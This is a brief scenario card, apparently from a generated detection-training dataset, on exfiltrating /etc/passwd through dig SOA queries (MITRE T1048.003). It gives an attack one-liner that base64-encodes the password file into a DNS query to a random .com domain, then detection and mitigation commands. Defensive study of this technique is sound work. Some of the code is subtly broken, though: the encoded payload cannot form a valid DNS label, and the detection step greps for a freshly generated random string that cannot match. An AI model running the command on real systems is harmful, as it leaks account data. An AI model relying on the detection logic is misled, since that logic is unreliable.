---
type: campaign
scenario_id: 456
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using dig to exfiltrate user list via DNS SOA queries.

## Threat Description
Using dig to exfiltrate user list via DNS SOA queries.

## Attack Command
```
dig +short SOA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(cat /etc/passwd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor dig SOA queries: `tcpdump -i any port 53 | grep SOA`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.

## AI Training Prompt
Train AI to detect dig-based DNS exfiltration of user list via SOA queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
